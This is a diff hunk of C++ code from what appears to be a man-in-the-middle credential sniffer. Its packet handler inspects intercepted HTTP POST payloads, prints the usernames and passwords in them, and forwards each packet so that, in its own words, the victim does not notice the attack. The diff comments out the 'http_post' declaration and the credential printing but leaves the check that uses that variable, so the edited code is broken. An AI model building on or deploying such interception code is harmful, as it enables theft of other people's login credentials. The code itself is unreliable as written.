@@ -121,16 +121,16 @@ void receiveHandler(int sockfd, std::map<std::vector<uint8_t>, std::vector<uint8
         uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
         int payload_length = n - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
-        // Check if the payload is an HTTP POST packet
-        const char *http_post = "POST";
+        // // Check if the payload is an HTTP POST packet
+        // const char *http_post = "POST";
 
         if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
             sendNonHttpPostPacket(buffer, n, sockfd, info);
             continue;
         }
 
-        // Print the username and password
-        printUsernameAndPassword(payload, payload_length);
+        // // Print the username and password
+        // printUsernameAndPassword(payload, payload_length);
 
         // Send the packet in order to prevent the victim from knowing the attack
         if (sendto(sockfd, buffer, n, 0, (struct sockaddr *)&info.device, sizeof(info.device)) <= 0) {
